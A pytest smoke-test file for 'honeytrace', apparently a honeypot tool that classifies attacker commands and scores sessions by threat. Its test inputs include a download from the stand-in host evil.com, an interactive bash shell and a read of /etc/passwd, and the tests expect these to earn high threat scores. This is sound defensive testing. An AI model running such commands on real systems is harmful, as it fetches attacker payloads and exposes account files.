"""Smoke tests for HONEYTRACE."""
from honeytrace import TOOL_NAME, TOOL_VERSION
from honeytrace.core import (
    classify_command,
    simulate_session,
    parse_events,
    analyze_events,
    score_session,
    SessionReport,
    SERVICE_PROFILES,
)


def test_version():
    assert TOOL_VERSION
    assert TOOL_NAME == "honeytrace"


def test_classify_command_recon():
    result = classify_command("whoami")
    assert result["tactic"] == "discovery"
    assert result["severity"] > 0


def test_classify_command_unknown():
    result = classify_command("echo hello")
    assert result["tactic"] == "uncategorized"


def test_simulate_session_returns_report():
    report = simulate_session("ssh", ["whoami", "uname -a"])
    assert isinstance(report, SessionReport)
    assert report.service == "ssh"
    assert report.command_count == 2
    assert report.threat_score >= 0
    assert report.verdict in ("benign", "low", "medium", "high", "critical")


def test_simulate_session_scores_high_for_dangerous_commands():
    cmds = ["wget http://evil.com/shell.sh", "chmod +x shell.sh", "/bin/bash -i"]
    report = simulate_session("ssh", cmds)
    # Reverse-shell + malware-download commands should produce a critical verdict
    assert report.verdict in ("high", "critical")
    assert report.threat_score >= 40


def test_service_profiles_present():
    for name in ("ssh", "rdp", "smb", "http"):
        assert name in SERVICE_PROFILES
        svc = SERVICE_PROFILES[name]
        assert svc.banner
        assert svc.port > 0


def test_parse_and_analyze_events():
    import json
    lines = [
        json.dumps({"ts": "2026-06-08T12:00:00+00:00", "src_ip": "1.2.3.4",
                    "service": "ssh", "session_id": "abc123",
                    "kind": "command", "data": "cat /etc/passwd"}),
        json.dumps({"ts": "2026-06-08T12:00:01+00:00", "src_ip": "1.2.3.4",
                    "service": "ssh", "session_id": "abc123",
                    "kind": "auth", "data": "login attempt"}),
    ]
    events = parse_events(lines)
    assert len(events) == 2
    # command event should be auto-classified
    cmd_ev = events[0]
    assert cmd_ev.tactic == "credential-access"

    reports = analyze_events(events)
    assert len(reports) == 1
    assert reports[0].src_ip == "1.2.3.4"
    assert reports[0].command_count == 1


def test_cli_importable():
    from honeytrace.cli import main
    assert callable(main)
